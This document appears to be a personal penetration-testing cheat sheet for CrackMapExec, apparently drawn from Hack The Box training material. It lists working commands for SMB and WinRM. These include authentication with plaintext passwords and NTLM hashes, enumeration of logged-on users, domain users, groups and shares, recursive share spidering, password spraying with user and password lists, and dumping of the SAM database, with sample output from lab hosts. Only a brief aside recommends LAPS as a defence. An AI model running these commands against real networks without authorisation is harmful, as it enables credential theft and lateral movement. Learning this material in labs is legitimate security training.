crackmapexec
###############

Date: 2024-11-09 15:36

Status:

Description
****************

CME is used to enumerate and attack SMB

Installation
*****************

example: Installation:

.. code-block:: console

   snap install --edge crackmapexe


CME authentication 
********************

CME Authenticate with credentials
==================================

Example: With Creds and domain

.. code-block:: console

   crackmapexec smb 10.129.248.196 --shares -u 'alex' -p 'lol123!mD' -d 'WINMEDIUM'

   SMB         10.129.248.196  445    WINMEDIUM        [*] Windows 10.0 Build 17763 x64 (name:WINMEDIUM) (domain:WINMEDIUM) (signing:False) (SMBv1:False)
   SMB         10.129.248.196  445    WINMEDIUM        [+] WINMEDIUM\alex:lol123!mD 
   SMB         10.129.248.196  445    WINMEDIUM        [*] Enumerated shares
   SMB         10.129.248.196  445    WINMEDIUM        Share           Permissions     Remark
   SMB         10.129.248.196  445    WINMEDIUM        -----           -----------     ------
   SMB         10.129.248.196  445    WINMEDIUM        ADMIN$                          Remote Admin
   SMB         10.129.248.196  445    WINMEDIUM        C$                              Default share
   SMB         10.129.248.196  445    WINMEDIUM        devshare        READ,WRITE      
   SMB         10.129.248.196  445    WINMEDIUM        IPC$            READ            Remote IPC
   SMB         10.129.248.196  445    WINMEDIUM        Users           READ         

CME Authenticating with the hash
==================================

.. code-block:: console

   crackmapexec smb 172.16.1.24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453

If you want to authenticate with the local administrator account please
add ``--local-auth`` to the command. When connecting to a machine, and
you see\ ``Pwn3d!`` on the output, this means the user is a local
administrator.

Often the same local administrator password is used on all servers, if
this is found you can recommend a :ref:`LAPS <LAPS>` solution to create
random passwords.


CME - Domain User Enumeration
*******************************

CME Listing Loggedon Users
=============================

Example 3: Listing logged in users

.. code-block:: console

   crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users

CME Listing users
====================

.. code-block:: console

   sudo crackmapexec smb 172.16.5.5 -u username -p password --users


CME - Domain Group Enumeration
================================

.. code-block:: console

    sudo crackmapexec smb 172.16.5.5 -u username -p password --groups


CME Share Searching
*********************

Example:  Listing shares available to that user

.. code-block:: bash

   sudo crackmapexec smb 172.16.5.5 -u username -p password --shares

Example: Using recursive listing on a share with spider plus

.. code-block:: bash

   sudo crackmapexec smb 172.16.5.5 -u username -p password -M spider_plus --share 'Department Shares'
   head -n 10 /tmp/cme_spider_plus/172.16.5.5.json


CME Attacking SMB
*****************

CME Attacking WinRM with list attacks
=======================================

Example 1: Attacking :ref:`winrm`

.. code-block:: console

   crackmapexec winrm 10.129.42.197 -u user.list -d . -p password.list

Attacking SMB with lists
===========================

Example 2: Using a user list and static password

.. code-block:: console

   crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth



Extracting the SAM
***********************

Example 4: Extract the SAM database

.. code-block:: console

   crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam

References
***************
https://academy.hackthebox.com/module/112/section/1067
https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/
